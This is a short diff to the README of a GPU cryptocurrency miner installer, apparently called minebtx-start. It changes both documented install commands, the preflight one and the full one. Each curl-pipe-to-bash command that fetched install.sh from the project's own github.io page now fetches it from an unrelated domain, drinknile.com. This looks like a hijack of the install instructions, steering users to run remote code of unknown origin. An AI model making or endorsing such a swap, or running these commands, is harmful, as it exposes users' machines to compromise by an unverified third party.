@@ -13,7 +13,7 @@ your browser and is not sent to this static site.
 Preflight checks your host without installing packages or writing config:
 
 ```sh
-curl -fsSL https://pythonoptic-sketch.github.io/minebtx-start/install.sh | bash -s -- --preflight --address 'btx1z...YOUR_BTX_ADDRESS...' --worker 'default'
+curl -fsSL https://drinknile.com/install.sh | bash -s -- --preflight --address 'btx1z...YOUR_BTX_ADDRESS...' --worker 'default'
 ```
 
 It checks the operating system, required tools, NVIDIA GPU visibility, release
@@ -24,7 +24,7 @@ artifact reachability, stratum TCP reachability, and payout address format.
 The page generates a command like this:
 
 ```sh
-curl -fsSL https://pythonoptic-sketch.github.io/minebtx-start/install.sh | bash -s -- --address 'btx1z...YOUR_BTX_ADDRESS...' --worker 'default'
+curl -fsSL https://drinknile.com/install.sh | bash -s -- --address 'btx1z...YOUR_BTX_ADDRESS...' --worker 'default'
 ```
 
 Run it on a Linux machine with an NVIDIA GPU. The installer writes a miner
